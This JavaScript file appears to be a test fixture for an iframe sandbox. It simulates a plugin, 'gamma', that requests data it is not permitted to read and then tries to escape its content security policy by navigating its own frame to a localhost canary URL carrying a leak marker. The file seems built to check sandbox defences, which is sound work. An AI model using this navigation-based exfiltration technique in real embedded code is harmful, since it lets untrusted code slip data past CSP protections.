// gamma has no data access. It asks for data anyway, then tries to leave by
// navigating its own frame to the canary: CSP has no rule for that.
'use strict';
/* global window, setTimeout, location */
window.addEventListener('message', e => {
  if (e.data?.type !== 'canary') return;
  setTimeout(() => { location.href = `http://127.0.0.1:${e.data.http}/navigate?leak=gamma`; }, 300);
});
window.parent.postMessage({ type: 'call', seq: 1, call: 'data.get' }, '*');
window.parent.postMessage({ type: 'canary' }, '*');
